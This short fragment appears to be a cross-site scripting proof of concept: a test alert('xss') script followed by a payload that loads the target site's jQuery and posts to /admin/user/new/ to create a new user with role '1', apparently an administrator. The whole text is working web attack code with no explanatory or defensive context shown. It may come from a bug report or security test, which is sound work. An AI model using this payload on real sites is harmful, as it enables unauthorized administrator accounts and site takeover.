<script>alert('xss')</script>

<script src="/admin/static/vendor/jquery.min.js?v=2.1.4" type="text/javascript"></script>
<script>$.post( "/admin/user/new/", { email: "blahblah", password: "blahblah", confirmed_at: "", roles: "1" } );</script>